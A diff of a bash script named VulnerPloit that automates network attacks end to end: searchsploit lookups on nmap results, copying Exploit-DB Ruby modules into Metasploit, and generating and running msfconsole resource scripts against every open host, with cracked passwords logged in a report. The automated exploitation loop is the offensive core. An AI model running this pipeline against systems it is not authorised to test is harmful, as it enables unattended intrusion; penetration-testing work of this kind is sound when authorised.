@@ -180,8 +180,9 @@ function SEARCHSPLOIT_VULN()
 	echo " "
 	echo "[*] Parsing output data from NMAP_ENUM Module..."
 	echo " "
-	echo "[*] Updating exploit database......"
-	sudo searchsploit -u
+	# This update takes a very long time: unhash the next two lines if you have time to spare
+	# echo "[*] Updating exploit database......"
+	# sudo searchsploit -u
 	echo " "
 	echo "[*] Executing Searchsploit Vulnerability Detection on enumerated hosts and services......(This may take a long time)"
 	echo " "
@@ -194,7 +195,7 @@ function SEARCHSPLOIT_VULN()
 	do
 		echo "[*] Detecting vulnerabilities on the services running on $openhost......"
 		echo " "
-		sudo searchsploit -x -v --nmap ${openhost}_enum.xml 2>/dev/null > ${openhost}_vuln.txt
+		sudo searchsploit -x -v --nmap ${openhost}_enum.xml 2>/dev/null >> ${openhost}_vuln.txt
 		
 	done
 	
@@ -272,12 +273,9 @@ function HYDRA_BRUTE()
 	echo " "
 }
 
-###############################
+#########################
 ### MSF_EXPLOIT FUNCTION
-###############################
-
-# https://myitgeneralist.blogspot.com/2018/09/importing-exploit-db-exploits-into.html
-# https://medium.com/swlh/metasploit-framework-basics-part-1-manual-to-automatic-exploitation-8182d0917193
+#########################
 
 ### DEFINITION
 
@@ -289,16 +287,19 @@ function MSF_EXPLOIT()
 	echo " "
 	echo "[*] Setting up Metasploit Framework database......"
 	echo " "
-	echo "Parsing output data from SEARCHSPLOIT_VULN Module..."
+	echo "[*] Parsing output data from SEARCHSPLOIT_VULN Module..."
 	echo " "
-	echo "[*] Executing Metasploit Vulnerability Exploitation on enumerated hosts and services......(Multiple background shells may be created)"
+	echo "[*] Executing Metasploit Vulnerability Exploitation on enumerated hosts and services......"
 	echo " "
+	echo "[*] Searching for Ruby Scripts to use as modules......"
+	echo " "
+	
 	
 	### MSF DATABASE SET-UP
 	# start the service for the backend database of MSF
 	sudo service postgresql start
 	# initialise MSF database
-	msfdb init
+	sudo msfdb init
 	cd ~/VulnerPloit/$session/$rangename
 	
 	### EXPLOITATION LOOP
@@ -307,41 +308,59 @@ function MSF_EXPLOIT()
 	
 	do 
 			
-		### EXTRACTION OF EXPLOIT-DB EXPLOITS
-		# extract paths of the potential exploits identified by SEARCHSPLOIT_VULN()
-		echo "$(cat ${openhost}_vuln.txt | grep / | awk '{print $NF}' | sort | uniq | sort )" > exploit_list.txt
+		### EXTRACTION OF IDENTIFIED EXPLOIT-DB RUBY SCRIPTS
+		# extract paths of the identified potential exploits (must be written in Ruby for MSF to run)
+		echo "$(cat ${openhost}_vuln.txt | grep / | awk '{print $NF}' | grep .rb | sort | uniq | sort )" > ${openhost}_exploitlist.txt 2>/dev/null
 		
-		### IMPORTATION OF EXPLOITS FROM EXPLOITDB TO MSFDB
-		for exploit_single in $(cat exploit_list.lst) 
+		### RESOURCE EXECUTION LOOP
+		for exploitsingle in $(cat ${openhost}_exploitlist.txt) 
 		do
-			cp /usr/share/exploitdb/exploits/$exploit_single /usr/share/metasploit-framework/modules/exploits/$exploit_single
+			### EXPLOIT TRANSFER FROM EXPLOITDB
+			# text manipulation of data to output the correct destination directory
+			echo "$exploitsingle" > exploitsingle.txt
+			field1=$(echo $(cat exploitsingle.txt | tr "/" " " | awk '{print $1}'))
+			field2=$(echo $(cat exploitsingle.txt | tr "/" " " | awk '{print $2}'))
+			field3=$(echo $(cat exploitsingle.txt | tr "/" " " | awk '{print $3}'))
+			cd ~/.msf4/modules
+			mkdir exploits 2>/dev/null
+			cd exploits 
+			mkdir $field1 2>/dev/null
+			cd $field1
+			mkdir $field2 2>/dev/null
+			# copy file (3 end-fields) from exploitdb to directory (2 end-fields) in msfdb
+			sudo cp /usr/share/exploitdb/exploits/$field1/$field2/$field3 ~/.msf4/modules/exploits/$field1/$field2 2>/dev/null
 			# update database
-			updatedb
+			sudo updatedb
+				
+			### MSF RESOURCE SCRIPTING
+			cd ~/VulnerPloit/$session/$rangename
+			# create a .rc file to act as a script for msf console        
+			echo "use exploit/$field1/$field2/$field3" > msfscript.rc
+			echo "set rhosts $openhost" >> msfscript.rc
+			listenerhost=$(echo "$(ifconfig | grep broadcast | awk '{print $2}')")
+			echo "set lhost $listenerhost" >> msfscript.rc
+			echo "run" >> msfscript.rc
+			echo "exploit" >> msfscript.rc
+			echo "exit" >> msfscript.rc
+		
+			### EXPLOITATION
+			# use -q to run msfconsole without the banner, and -r to execute resource script within console
+			msfconsole -q -r msfscript.rc 2>/dev/null 1>>~/VulnerPloit/$session/$rangename/${openhost}_msfoutput.txt
+			
+			### CLEAN-UP
+			# force-remove resource file and temporary files to build a clean resource file for the next exploit module in the list
+			sudo rm -f msfscript.rc
+			rm -f exploitsingle.txt
+		
 		done
-		
-		### MSF RESOURCE SCRIPTING
-		cd ~/VulnerPloit/$session/$rangename
-		# create a .rc file to act as a script for msf console        
-        echo "use exploit/$exploit_single" > ${openhost}_msfscript.rc
-        echo "set rhosts $openhost" >> ${openhost}_msfscript.rc
-		listenerhost=$(echo "$(ifconfig | grep broadcast | awk '{print $2}')")
-        echo "set lhost $listenerhost" >> ${openhost}_msfscript.rc
-		# include -j to run multiple exploit shells in multiple background sessions
-       	echo "exploit -j" >> ${openhost}_msfscript.rc
-       	# spool the output of the MSF console after see the result of the exploit attempt
-       	echo "spool ~/VulnerPloit/$session/$rangename/${openhost}_msfoutput.txt" >> ${openhost}_msfscript.rc
-		
-		### EXPLOITATION
-		# use -q to run msfconsole without the banner, and -r to execute resource script within console
-		msfconsole -q -r ${openhost}_msfscript.rc 2>/dev/null
 		
 	done
 	
 	### END
-        # let user know that the exploitation is done
-        echo " "
-        echo "[+] Metasploit Framework Vulnerability Exploitation has been executed."
-        echo " "
+    # let user know that the exploitation is done
+    echo " "
+    echo "[+] Metasploit Framework Vulnerability Exploitation has been executed."
+    echo " "
 }
 
 #################
@@ -369,6 +388,8 @@ function LOG()
 		touch ${openhost}_vulnmap.txt
 		# insert title and date-time
 		DateTime=$(echo "$(date +%F) $(date +%X | awk '{print $1}')")
+		echo " " >> ${openhost}_vulnmap.txt
+		echo " " >> ${openhost}_vulnmap.txt
 		echo "#########################################################" >> ${openhost}_vulnmap.txt
 		echo "VULNERABILITY MAP: $openhost | $DateTime" >> ${openhost}_vulnmap.txt
 		echo "#########################################################" >> ${openhost}_vulnmap.txt
@@ -378,14 +399,15 @@ function LOG()
 	
 		### TOTAL OPEN HOSTS LOGGING
 		echo " " >> ${openhost}_vulnmap.txt
-		echo "###########" >> ${openhost}_vulnmap.txt
-		echo "OPEN HOSTS:" >> ${openhost}_vulnmap.txt
-		echo "###########" >> ${openhost}_vulnmap.txt
+		echo "######################" >> ${openhost}_vulnmap.txt
+		echo "OPEN HOSTS IN NETWORK:" >> ${openhost}_vulnmap.txt
+		echo "######################" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
 		echo "$(cat nmap_openhosts.lst | tr " " "\n")" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
 		
 		### OPEN SERVICES DISCOVERY LOGGING
+		echo " " >> ${openhost}_vulnmap.txt
 		echo "ENUMERATED SERVICES" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
 		echo "-------------------" >> ${openhost}_vulnmap.txt
@@ -394,6 +416,7 @@ function LOG()
 		echo " " >> ${openhost}_vulnmap.txt
 		
 		### POTENTIAL EXPLOITS LOGGING
+		echo " " >> ${openhost}_vulnmap.txt
 		echo "POTENTIAL EXPLOITS" >> ${openhost}_vulnmap.txt
 		echo "-----------------" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
@@ -402,6 +425,7 @@ function LOG()
 		echo " " >> ${openhost}_vulnmap.txt
 		
 		### WEAK PASSWORDS LOGGING
+		echo " " >> ${openhost}_vulnmap.txt
 		echo "CRACKED PASSWORDS" >> ${openhost}_vulnmap.txt
 		echo "-----------------" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
@@ -409,10 +433,11 @@ function LOG()
 		echo " "
 		
 		### EXPLOITATION ATTEMPTS
-		echo "EXPLOITATION ATTEMPTS" >> ${openhost}_vulnmap.txt
-		echo "---------------------" >> ${openhost}_vulnmap.txt
 		echo " " >> ${openhost}_vulnmap.txt
-		echo "$(cat ${openhost}_msfoutput.txt)" >> ${openhost}_vulnmap.txt
+		echo "EXPLOITATION ATTEMPTS (RUBY MODULES)" >> ${openhost}_vulnmap.txt
+		echo "------------------------------------" >> ${openhost}_vulnmap.txt
+		echo " " >> ${openhost}_vulnmap.txt
+		echo "$(cat ${openhost}_msfoutput.txt)" >> ${openhost}_vulnmap.txt 2>/dev/null
 		echo " "
 		
 		### INDIVIDUAL HOST SUBDIRECTORY
@@ -427,24 +452,24 @@ function LOG()
 		
 		### ORGANISING RAW OUTPUT FILES FOR INDIVIDUAL HOSTS
 		cd ~/VulnerPloit/$session/$rangename
-		mv ${openhost}_enum.xml ~/VulnerPloit/$session/$rangename/$openhost/raw_output
-		mv ${openhost}_enum.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
-		mv ${openhost}_vuln.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
-		mv ${openhost}_passwords.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
-		mv ${openhost}_msfscript.rc ~/VulnerPloit/$session/$rangename/$openhost/raw_output
-		mv ${openhost}_msfoutput.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output
+		mv ${openhost}_enum.xml ~/VulnerPloit/$session/$rangename/$openhost/raw_output 2>/dev/null
+		mv ${openhost}_enum.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output 2>/dev/null
+		mv ${openhost}_vuln.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output 2>/dev/null
+		mv ${openhost}_passwords.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output 2>/dev/null
+		mv ${openhost}_exploitlist.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output 2>/dev/null
+		mv ${openhost}_msfoutput.txt ~/VulnerPloit/$session/$rangename/$openhost/raw_output 2>/dev/null
 	
 	done
 	
 	### COMBINE ALL INDIVIDUAL OUTPUT FOR TERMINAL OUTPUT
 	# combine the individual reports in the range directory for a super-report for the entire range
 	cd ~/VulnerPloit/$session/$rangename
-	echo "$(cat ~/VulnerPloit/$session/$rangename/*_vulnmap.txt)" > ${rangename}.vulnmap.txt
+	echo "$(cat ~/VulnerPloit/$session/$rangename/*_vulnmap.txt)" > ${rangename}_vulnmap.txt
 	
 	### REPORT
 	# print the combined report into the terminal 
 	# insert figlet before the combined output
-	echo "$(figlet -c -f ~/VulnerPloit/figrc/cyberlarge.flf -t "VulnerPloit")" >> ${openhost}_vulnmap.txtt
+	echo "$(figlet -c -f ~/VulnerPloit/figrc/cyberlarge.flf -t "VulnerPloit")" >> ${rangename}_vulnmap.txt
 	cat ${rangename}_vulnmap.txt
 	echo " "
 	echo "[+] VULNERABILITY MAP REPORT:"
@@ -454,8 +479,10 @@ function LOG()
 	echo " "
 	
 	### CLEAN-UP
-	# remove the individual reports in the range directory
-	rm *_vulnmap.txt
+	# remove the extra copies of individual reports and other transitionary files in the range directory
+	rm -f *vulnmap.txt
+	rm -f nmap_openhosts.lst
+	rm -f nmap_scan.txt
 }
 
 ###################
